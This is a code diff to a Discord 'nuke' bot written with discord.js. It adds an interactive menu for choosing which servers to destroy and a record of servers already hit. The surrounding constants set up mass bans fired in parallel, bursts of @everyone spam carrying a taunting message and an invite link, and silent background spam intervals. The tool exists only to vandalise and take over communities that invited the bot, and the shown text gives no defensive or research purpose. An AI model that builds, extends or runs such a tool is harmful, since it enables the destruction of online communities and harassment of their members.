@@ -1,4 +1,5 @@
 import { Client, GatewayIntentBits, ChannelType, Events, PermissionFlagsBits } from "discord.js";
+import { checkbox } from "@inquirer/prompts";
 import dotenv from "dotenv";
 import readline from "readline";
 
@@ -21,11 +22,13 @@ const NUKE_NAME    = "come-to-hell";
 const NUKE_MESSAGE = `# I made this hell, Now come to hell!\n*I turned heaven into hell @everyone hahaha*\nhttps://discord.gg/c2h`;
 const PROTECTED_ID = "1291403526311772298";
 
-const BURST_COUNT     = 100;
+const BURST_COUNT     = 100;  // Amount of messages to sent as inital
 const BURST_DELAY_MS  = 500;  // delay between each message inside one channel's burst
 const BAN_CONCURRENCY = 10;   // how many bans fire in parallel at once
 const BAN_CHUNK_DELAY = 300;  // ms between ban chunks
 const INTERVAL_MS     = 5000; // silent background spam cadence
+
+const nukedGuildIds = new Set(); // track servers nuked in current runtime
 
 // ===== HELPERS =====
 
@@ -230,9 +233,25 @@ async function nukeAllGuilds() {
       const guild = await client.guilds.fetch(oauthGuild.id);
       await nukeGuild(guild);
     } catch (err) {
-      console.error(`❌ Could not process guild [${oauthGuild.id}]: ${err.message}`);
+      console.error(`❌ Could not nuke guild [${oauthGuild.id}]: ${err.message}`);
     }
   }
+}
+
+async function getGuildList() {
+  const oauthGuilds = await client.guilds.fetch();
+  const guilds = [];
+
+  for (const oauthGuild of oauthGuilds.values()) {
+    try {
+      const guild = await client.guilds.fetch(oauthGuild.id);
+      guilds.push({ id: guild.id, name: guild.name, nuked: nukedGuildIds.has(guild.id) });
+    } catch {
+      // ignore guilds we cannot fetch
+    }
+  }
+
+  return guilds;
 }
 
 // ===== CLI =====
@@ -249,13 +268,47 @@ function promptCommand() {
 
     if (cmd === "nuke") {
       console.log("🔥 Nuke sequence started...\n");
-      try {
-        await nukeAllGuilds();
-        console.log("\n✅ All phases done.");
-        console.log("   Background intervals are running silently.");
-        console.log("   Type 'exit' to stop everything.\n");
-      } catch (err) {
-        console.error("❌ Nuke error:", err.message);
+
+      const guilds = await getGuildList();
+      if (!guilds.length) {
+        console.log('⚠️  No accessible guilds found for nuking.');
+      } else {
+        const selectedGuildIds = await checkbox({
+          message: 'Select guild(s) to nuke (space to select, enter to confirm):',
+          choices: guilds.map((g) => ({
+            name: `${g.name}${g.nuked ? ' (Nuked)' : ''}`,
+            value: g.id,
+            disabled: g.nuked ? 'already nuked' : false,
+          })),
+          hint: 'Use arrow keys + space; enter to continue',
+          validate(answer) {
+            if (!answer.length) return 'Choose at least one guild to nuke';
+            return true;
+          },
+        });
+
+        if (!selectedGuildIds || !selectedGuildIds.length) {
+          console.log('⚠️  No guild selected.');
+          promptCommand();
+          return;
+        }
+
+        for (const guildId of selectedGuildIds) {
+          const guildInfo = guilds.find((g) => g.id === guildId);
+          if (!guildInfo) continue;
+
+          try {
+            const g = await client.guilds.fetch(guildId);
+            await nukeGuild(g);
+            nukedGuildIds.add(guildId);
+            console.log(`🏴‍☠️  Marked nuked: ${guildInfo.name} (${guildId})`);
+          } catch (err) {
+            console.error(`❌ Error nuking ${guildInfo.name} (${guildId}): ${err.message}`);
+          }
+        }
+
+        console.log('\n✅ Nuke command completed.');
+        console.log("   Type 'nuke' to choose again or 'exit' to stop.");
       }
     } else if (cmd === "exit") {
       console.log("👋 Destroying client — all intervals will stop...");
